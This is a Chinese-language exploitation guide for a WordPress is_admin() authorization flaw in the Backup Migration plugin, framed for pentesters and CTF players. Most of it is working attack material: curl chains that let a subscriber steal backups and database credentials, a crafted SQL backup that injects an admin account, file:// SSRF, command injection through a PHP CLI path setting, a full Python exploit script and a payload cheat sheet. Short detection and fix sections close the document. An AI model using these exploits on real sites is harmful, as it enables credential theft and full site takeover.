# WordPress is_admin() 权限绕过

## 1. 概述

本文档描述针对 WordPress 插件中 `is_admin()` 误用导致的垂直权限提升攻击方法论。许多插件开发者错误地使用 `is_admin()` 进行权限检查，而该函数仅检查当前页面是否在 `/wp-admin/` 目录下，**不检查用户实际权限**。

### 1.1 漏洞本质

**错误用法:**
```php
// 错误的权限检查
if (is_admin()) {
    // 执行特权操作
}
```

**正确用法:**
```php
// 正确的权限检查
if (current_user_can('manage_options')) {
    // 执行特权操作
}
```

**关键区别:**
- `is_admin()`: 仅检查是否在 `/wp-admin/` 目录
- `current_user_can()`: 检查用户是否具有特定能力

### 1.2 适用范围

- WordPress Backup Migration 插件 v1.3.5
- 其他误用 `is_admin()` 的 WordPress 插件
- CTF 挑战中存在类似权限检查缺陷的应用

### 1.3 读者对象

- 执行 WordPress 渗透测试的安全工程师
- CTF 竞赛参赛者
- 进行插件代码审计的安全分析师

---

## 2. 攻击场景

### 2.1 前置条件

| 条件 | 要求 | 说明 |
|------|------|------|
| 认证 | 任意 WordPress 认证用户 | Subscriber 级别即可 |
| 访问能力 | 能够访问 /wp-admin/ 目录 | 所有认证用户默认都有此能力 |
| 目标插件 | 使用 `is_admin()` 检查的插件 | 如 Backup Migration v1.3.5 |

### 2.2 WordPress 角色能力矩阵

| 角色 | is_admin() 生效 | current_user_can('manage_options') |
|------|-----------------|-----------------------------------|
| Anonymous | ❌ | ❌ |
| Subscriber | ✅ | ❌ |
| Contributor | ✅ | ❌ |
| Author | ✅ | ❌ |
| Editor | ✅ | ❌ |
| Administrator | ✅ | ✅ |

**攻击原理:** 插件使用 `is_admin()` 时，Subscriber 到 Editor 的所有角色都能通过检查，但实际上他们不应该有管理员权限。

---

## 3. 漏洞探测方法

### 3.1 创建低权限测试账户

**步骤 1: 通过数据库创建 Subscriber 账户**

```bash
docker exec wordpress_container bash -c "cd /var/www/html && php -r \"
require 'wp-load.php';
\$user_id = wp_create_user('lowpriv', 'lowpriv123', 'lowpriv@test.com');
\$user = new WP_User(\$user_id);
\$user->set_role('subscriber');
echo 'User created: ID=' . \$user_id;
\""
```

**步骤 2: 验证账户权限**

```bash
docker exec wordpress_container bash -c "cd /var/www/html && php -r \"
define('WP_ADMIN', true);
require 'wp-load.php';
\$user = get_user_by('login', 'lowpriv');
wp_set_current_user(\$user->ID);

echo 'Role: ' . implode(', ', \$user->roles) . PHP_EOL;
echo 'is_admin(): ' . (is_admin() ? 'TRUE' : 'FALSE') . PHP_EOL;
echo 'can manage_options: ' . (current_user_can('manage_options') ? 'YES' : 'NO') . PHP_EOL;
\""
```

**预期输出:**
```
Role: subscriber
is_admin(): TRUE
can manage_options: NO
```

### 3.2 验证插件权限检查

**测试 Backup Migration 插件:**

```bash
docker exec wordpress_container bash -c "cd /var/www/html && php -r \"
define('WP_ADMIN', true);
require 'wp-load.php';
\$user = get_user_by('login', 'lowpriv');
wp_set_current_user(\$user->ID);

// 模拟插件权限检查
if (is_admin()) {
    echo '[!] is_admin() check PASSED - Vulnerable!' . PHP_EOL;
} else {
    echo '[-] is_admin() check FAILED' . PHP_EOL;
}

// 正确的权限检查
if (current_user_can('manage_options')) {
    echo '[-] current_user_can() check PASSED - Secure' . PHP_EOL;
} else {
    echo '[*] current_user_can() check FAILED - Correct behavior' . PHP_EOL;
}
\""
```

**预期输出:**
```
[!] is_admin() check PASSED - Vulnerable!
[*] current_user_can() check FAILED - Correct behavior
```

---

## 4. 漏洞利用方法

### 4.1 利用方式一：备份创建（信息收集）

**端点:** `POST /wp-admin/admin-ajax.php?action=backup_migration&f=create-backup`

**利用步骤:**

```bash
# 步骤 1: 以 Subscriber 身份登录
curl -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -d "log=lowpriv&pwd=lowpriv123&wp-submit=Log+In" \
  "http://target:45513/wp-login.php"

# 步骤 2: 提取 nonce
NONCE=$(curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin.php?page=backup-migration" \
  | grep -oP 'nonce["\s:=]+[a-f0-9]+' | head -1 | grep -oP '[a-f0-9]+')

# 步骤 3: 创建备份（Subscriber 不应有此权限）
curl -b /tmp/cookies.txt \
  -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=create-backup" \
  -d "nonce=$NONCE"

# 预期响应：{"status":"success",...}
```

**影响:**
- 创建完整站点备份
- 包含数据库凭证
- 包含 WordPress 密钥
- 为后续攻击提供条件

### 4.2 利用方式二：备份下载（凭证窃取）

**端点:** `GET /?backup-migration=BMI_BACKUP&backup-id=[filename]`

**利用步骤:**

```bash
# 步骤 1: 枚举备份文件
curl -b /tmp/cookies.txt \
  -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=get-current-backups" \
  -d "nonce=$NONCE"

# 响应示例：{"status":"success","backups":["BM_Backup_2024-06-12_xxx.zip"]}

# 步骤 2: 下载备份
curl -b /tmp/cookies.txt \
  "http://target:45513/?backup-migration=BMI_BACKUP&backup-id=BM_Backup_2024-06-12_xxx.zip" \
  -o stolen_backup.zip

# 步骤 3: 提取敏感信息
unzip -l stolen_backup.zip
unzip -p stolen_backup.zip wordpress_backup/wp-config.php | grep DB_PASSWORD
```

**提取的敏感信息:**
```php
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'wordpress');
define('AUTH_KEY', '...');
```

### 4.3 利用方式三：备份恢复（站点接管）

**端点:** `POST /wp-admin/admin-ajax.php?action=backup_migration&f=restore-backup`

**利用步骤:**

**步骤 1: 创建恶意备份**

```sql
-- malicious_backup.sql
/* REAL_TABLE_NAME: `wp_posts`; INSERT INTO wp_users (user_login, user_pass, user_email) VALUES ('attacker', '\$P\$BKNOWNHASH', 'attacker@evil.com'); --` */
CREATE TABLE IF NOT EXISTS `wp_posts` (ID bigint);

/* REAL_TABLE_NAME: `wp_options`; INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login='attacker'), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'); --` */
CREATE TABLE IF NOT EXISTS `wp_options` (option_id bigint);
```

**步骤 2: 打包并上传**

```bash
# 创建 manifest.json
cat > manifest.json << 'EOF'
{
    "backup_name": "malicious",
    "backup_date": "2024-06-12",
    "site_url": "http://target"
}
EOF

# 打包
zip malicious.zip malicious_backup.sql manifest.json

# 上传
curl -b /tmp/cookies.txt \
  -F "file_data=@malicious.zip" \
  "http://target:45513/wp-admin/admin-ajax.php?action=backup_migration&token=bmi&f=upload-backup&nonce=$NONCE"
```

**步骤 3: 触发恢复**

```bash
curl -b /tmp/cookies.txt \
  -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=restore-backup" \
  -d "nonce=$NONCE" \
  -d "file=malicious.zip"
```

**步骤 4: 以新管理员身份登录**

```bash
curl -c /tmp/admin_cookies.txt \
  -d "log=attacker&pwd=KnownPassword123&wp-submit=Log+In" \
  "http://target:45513/wp-login.php"
```

**影响:** 完全站点接管

### 4.4 利用方式四：SSRF 读取 Flag（CTF 场景）

**端点:** `POST /wp-admin/admin-ajax.php?action=backup_migration&f=download-backup`

**利用步骤:**

```bash
# Subscriber 执行 SSRF 读取 Flag
curl -b /tmp/cookies.txt \
  -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "nonce=$NONCE" \
  -d "url=file:///opt/flag.txt"

# 响应：{"status":"cli_download",...}

# 下载包含 Flag 的备份
curl -b /tmp/cookies.txt \
  "http://target:45513/?backup-migration=BMI_BACKUP&backup-id=[filename]" \
  -o flag_backup.zip

# 提取 Flag
unzip -p flag_backup.zip flag.txt
```

**预期输出:**
```
FLAG{0e640864c2718bb34e01e700391986e28ecd6fbe98b4569ef4ccc4cee16a4b2c}
```

### 4.5 利用方式五：配置修改（持久化）

**端点:** `POST /wp-admin/admin-ajax.php?action=backup_migration&f=save-other-options`

**利用步骤:**

```bash
# 修改 PHP CLI 路径实现持久化 RCE
curl -b /tmp/cookies.txt \
  -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=save-other-options" \
  -d "nonce=$NONCE" \
  -d 'php_cli_manual_path=/bin/bash -c "cat /opt/flag.txt > /tmp/pwned.txt" #'

# 触发任何备份操作执行恶意命令
curl -b /tmp/cookies.txt \
  -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -d "action=backup_migration&token=bmi&f=create-backup" \
  -d "nonce=$NONCE"

# 验证执行结果
docker exec wordpress_container cat /tmp/pwned.txt
```

---

## 5. 完整攻击链

### 5.1 Subscriber → Administrator 攻击链

```
[1] 创建 Subscriber 账户
          │
          ▼
[2] 登录获取 Cookie
          │
          ▼
[3] 提取 AJAX Nonce
          │
          ▼
[4] 创建备份（信息收集）
          │
          ▼
[5] 下载备份（提取凭证）
          │
          ▼
[6] 创建恶意备份（注入管理员）
          │
          ▼
[7] 恢复备份（执行 SQL 注入）
          │
          ▼
[8] 以新管理员登录（完全控制）
```

### 5.2 CTF Flag 捕获攻击链

```
[1] 创建 Subscriber 账户
          │
          ▼
[2] 登录获取 Cookie
          │
          ▼
[3] 提取 AJAX Nonce
          │
          ▼
[4] SSRF 读取 /opt/flag.txt
          │
          ▼
[5] 下载备份获取 Flag
          │
          ▼
[6] Flag 提交 ✓
```

---

## 6. 自动化利用脚本

```python
#!/usr/bin/env python3
"""
WordPress is_admin() Bypass Exploit
Escalate from Subscriber to Administrator
"""

import requests
import re
import zipfile
import io
import sys

class WordPressIsAdminBypass:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.nonce = None
    
    def create_subscriber_account(self, username, password, email):
        """创建 Subscriber 账户（需要数据库访问）"""
        print(f"[*] Creating subscriber account: {username}")
        # 这通常需要数据库访问，简化示例
        pass
    
    def login(self, username, password):
        """登录获取会话"""
        print(f"[*] Logging in as {username}")
        
        resp = self.session.post(f"{self.target}/wp-login.php",
                                data={
                                    "log": username,
                                    "pwd": password,
                                    "wp-submit": "Log In"
                                })
        
        if "wp-login.php" in resp.url:
            print("[-] Login failed")
            return False
        
        print("[+] Login successful")
        return True
    
    def extract_nonce(self):
        """提取 AJAX nonce"""
        resp = self.session.get(f"{self.target}/wp-admin/admin.php?page=backup-migration")
        
        match = re.search(r'nonce["\s:=]+([a-f0-9]+)', resp.text)
        if match:
            self.nonce = match.group(1)
            print(f"[+] Nonce: {self.nonce}")
            return True
        
        print("[-] Failed to extract nonce")
        return False
    
    def create_backup(self):
        """创建备份"""
        print("[*] Creating backup...")
        
        resp = self.session.post(f"{self.target}/wp-admin/admin-ajax.php",
                                data={
                                    "action": "backup_migration",
                                    "token": "bmi",
                                    "f": "create-backup",
                                    "nonce": self.nonce
                                })
        
        print(f"[+] Backup creation response: {resp.json()}")
        return resp.json()
    
    def get_backups(self):
        """获取备份列表"""
        print("[*] Getting backup list...")
        
        resp = self.session.post(f"{self.target}/wp-admin/admin-ajax.php",
                                data={
                                    "action": "backup_migration",
                                    "token": "bmi",
                                    "f": "get-current-backups",
                                    "nonce": self.nonce
                                })
        
        data = resp.json()
        if data.get('status') == 'success':
            backups = data.get('backups', [])
            print(f"[+] Found {len(backups)} backups: {backups}")
            return backups
        
        return []
    
    def download_backup(self, filename):
        """下载备份文件"""
        print(f"[*] Downloading backup: {filename}")
        
        resp = self.session.get(
            f"{self.target}/?backup-migration=BMI_BACKUP&backup-id={filename}"
        )
        
        with open('/tmp/stolen_backup.zip', 'wb') as f:
            f.write(resp.content)
        
        print("[+] Backup downloaded to /tmp/stolen_backup.zip")
        return '/tmp/stolen_backup.zip'
    
    def ssrf_read_flag(self):
        """SSRF 读取 Flag"""
        print("[*] Executing SSRF to read /opt/flag.txt...")
        
        resp = self.session.post(f"{self.target}/wp-admin/admin-ajax.php",
                                data={
                                    "action": "backup_migration",
                                    "token": "bmi",
                                    "f": "download-backup",
                                    "nonce": self.nonce,
                                    "url": "file:///opt/flag.txt"
                                })
        
        print(f"[+] SSRF response: {resp.json()}")
        return resp.json()
    
    def run_full_exploit(self, username, password):
        """执行完整利用流程"""
        print("=" * 60)
        print("WordPress is_admin() Bypass Exploit")
        print("=" * 60)
        
        # Step 1: Login as subscriber
        if not self.login(username, password):
            return None
        
        # Step 2: Extract nonce
        if not self.extract_nonce():
            return None
        
        # Step 3: Create backup (demonstrates privilege escalation)
        self.create_backup()
        
        # Step 4: Get backup list
        backups = self.get_backups()
        
        # Step 5: Download backup (demonstrates IDOR)
        if backups:
            self.download_backup(backups[0])
        
        # Step 6: SSRF read flag (CTF scenario)
        self.ssrf_read_flag()
        
        print("\n[+] Exploit completed!")
        print("[*] Check /tmp/stolen_backup.zip for extracted data")
        print("[*] Check backup download for flag")

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target> <username> <password>")
        print(f"Example: {sys.argv[0]} http://localhost:45513 lowpriv lowpriv123")
        sys.exit(1)
    
    target = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    
    exploit = WordPressIsAdminBypass(target)
    exploit.run_full_exploit(username, password)

if __name__ == "__main__":
    main()
```

---

## 7. 检测与防御

### 7.1 检测指标

| 指标 | 检测方法 |
|------|----------|
| 低权限用户访问 admin-ajax.php | 监控 Subscriber/Contributor 的 AJAX 请求 |
| 备份操作频率异常 | 监控单位时间内备份创建/下载数量 |
| 非常规时间备份操作 | 监控非工作时间的备份活动 |
| SSRF 特征 URL | 监控 file://、gopher:// 协议请求 |

### 7.2 修复建议

**代码修复:**

```php
// 修复前（脆弱）
if ((isset($_POST['token']) && $_POST['token'] == 'bmi' && isset($_POST['f']) && is_admin()) || $cli) {
    // 执行特权操作
}

// 修复后（安全）
if ((isset($_POST['token']) && $_POST['token'] == 'bmi' && isset($_POST['f']) && current_user_can('manage_options')) || $cli) {
    // 执行特权操作
}

// 或者使用更细粒度的能力检查
if (current_user_can('activate_plugins')) {
    // 仅允许管理员
}
```

**插件配置修复:**

```php
// 在插件初始化时注册自定义能力
function register_backup_capability() {
    $admin = get_role('administrator');
    $admin->add_cap('do_backups');
    
    // 确保其他角色没有此能力
    $roles = ['editor', 'author', 'contributor', 'subscriber'];
    foreach ($roles as $role_name) {
        $role = get_role($role_name);
        if ($role) {
            $role->remove_cap('do_backups');
        }
    }
}
add_action('init', 'register_backup_capability');

// 使用自定义能力进行检查
if (current_user_can('do_backups')) {
    // 执行备份操作
}
```

---

## 8. 参考资源

- [WordPress is_admin() 文档](https://developer.wordpress.org/reference/functions/is_admin/)
- [WordPress Capabilities 文档](https://developer.wordpress.org/reference/functions/current_user_can/)
- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [WPScan Vulnerability Database](https://wpscan.com/vulnerability/)

---

## 9. 附录：Payload 速查表

| 攻击目标 | Payload/端点 |
|----------|--------------|
| 创建备份 | `f=create-backup` |
| 下载备份 | `f=download-backup&url=file:///opt/flag.txt` |
| 恢复备份 | `f=restore-backup&file=malicious.zip` |
| 枚举备份 | `f=get-current-backups` |
| 删除备份 | `f=delete-backup&filenames[]=backup.zip` |
| 修改配置 | `f=save-other-options&php_cli_manual_path=/evil.sh` |
| 创建 Staging | `f=staging-local-creation-process` |
| 重置配置 | `f=reset-configuration` |
